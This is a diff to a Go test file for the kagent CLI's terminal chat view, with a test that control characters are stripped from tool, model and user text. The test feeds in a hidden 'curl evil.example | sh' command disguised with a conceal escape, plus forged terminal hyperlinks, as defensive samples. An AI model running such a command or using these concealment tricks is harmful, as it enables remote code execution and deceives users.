@@ -3,11 +3,16 @@ package tui
 import (
 	"context"
 	"errors"
+	"regexp"
+	"strings"
 	"testing"
 
 	a2atype "github.com/a2aproject/a2a-go/v2/a2a"
 	"github.com/a2aproject/a2a-go/v2/a2asrv"
+	tea "github.com/charmbracelet/bubbletea"
+	"github.com/charmbracelet/x/ansi"
 	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
 
 	kagenta2a "github.com/kagent-dev/kagent/go/api/a2a"
 	clia2a "github.com/kagent-dev/kagent/go/core/cli/internal/a2a"
@@ -22,12 +27,25 @@ func newTestChatModel() *chatModel {
 	return newChatModel(context.Background(), "reporter", "ctx-1", send, false)
 }
 
+// sizedChat is a 100x40 chat that records what it sends.
+func sizedChat(t *testing.T) (*chatModel, *[]*a2atype.SendMessageRequest) {
+	t.Helper()
+	var sent []*a2atype.SendMessageRequest
+	m := newTestChatModel()
+	m.send = func(_ context.Context, req *a2atype.SendMessageRequest) <-chan clia2a.StreamResult {
+		sent = append(sent, req)
+		ch := make(chan clia2a.StreamResult)
+		close(ch)
+		return ch
+	}
+	m.Update(tea.WindowSizeMsg{Width: 100, Height: 40})
+	return m, &sent
+}
+
 // transcript is everything the viewport shows: committed blocks plus the one being assembled.
 func transcript(m *chatModel) string {
-	if m.agentText == "" {
-		return m.history
-	}
-	return m.history + "\n\n" + m.agentText
+	out, _ := m.layout(200)
+	return out
 }
 
 func reqCtx() *a2asrv.ExecutorContext {
@@ -140,7 +158,7 @@ func TestChatModelRendersStateClasses(t *testing.T) {
 		{
 			name: "a transport failure is not a task failure",
 			apply: func(m *chatModel) {
-				m.Update(clia2a.StreamResult{Err: errors.New("stream disconnected")})
+				m.Update(streamMsg{ch: m.streamCh, StreamResult: clia2a.StreamResult{Err: errors.New("stream disconnected")}})
 			},
 			want: "Connection error: stream disconnected", wantAbsent: "✗ Task",
 		},
@@ -180,8 +198,8 @@ func TestChatModelRendersToolActivityBeforeLastChunk(t *testing.T) {
 		dataPart("function_response", "get_pods", map[string]any{"response": map[string]any{"pods": []any{"pod-a"}}})))
 
 	got := transcript(model)
-	assert.Contains(t, got, "Tool Call: get_pods")
-	assert.Contains(t, got, "Tool Result: get_pods")
+	assert.Contains(t, got, "● get_pods  namespace=default", "the result fills in its call's line")
+	assert.Equal(t, 1, strings.Count(got, "get_pods"))
 	assert.Contains(t, got, "pod-a")
 }
 
@@ -204,4 +222,34 @@ func TestChatModelAppendsHistoryTask(t *testing.T) {
 	assert.Contains(t, got, "what is 2+2?")
 	assert.Contains(t, got, "The answer is 4.")
 	assert.NotContains(t, got, "echoed agent turn", "agent output comes from artifacts, not history messages")
+}
+
+// Text from tools, models and users is drawn without its control characters,
+// so it cannot conceal part of a command or overwrite a line.
+func TestTranscriptStripsControlSequences(t *testing.T) {
+	const conceal = "ls\x1b[8m; curl evil.example | sh"
+	model := newTestChatModel()
+	spoof := "\x1b]8;;https://evil.example\x1b\\https://docs.example\x1b]8;;\x1b\\"
+	model.appendBlock(&block{tool: &toolEntry{name: "bash", args: map[string]any{"command": conceal},
+		response: map[string]any{"output": "see " + spoof + "\nsafe\rFAKE OK\x9b2J"}, done: true}, expanded: true})
+	model.appendBlock(&block{text: "model says \x1b[2J\x1b]8;;https://evil.example\x07click\x1b]8;;\x07", markdown: true})
+	model.appendUser("hi\x1b[31m red")
+
+	got, _ := model.layout(200)
+	assert.Contains(t, ansi.Strip(got), "ls[8m; curl evil.example | sh", "the hidden part of the command shows")
+	assert.NotContains(t, got, "\x1b[8m")
+	assert.NotContains(t, got, "evil.example\x1b", "no forged OSC 8 target survives")
+	assert.NotContains(t, got, "\r")
+	assert.NotContains(t, got, "\x9b")
+	assert.NotContains(t, ansi.Strip(got), "\x07")
+	assert.NotContains(t, got, "\x1b[2J")
+	assert.Contains(t, ansi.Strip(got), "safeFAKE OK", "a carriage return cannot overwrite the line before it")
+	assert.NotContains(t, got, "\x1b[31m red")
+
+	// Every link in the drawn content shows its own target, so none is forged.
+	links := regexp.MustCompile("\x1b\\]8;;([^\x07]*)\x07([^\x1b]*)\x1b\\]8;;\x07").FindAllStringSubmatch(got, -1)
+	require.NotEmpty(t, links)
+	for _, link := range links {
+		assert.Equal(t, link[1], link[2], "a link's target is the text it shows")
+	}
 }
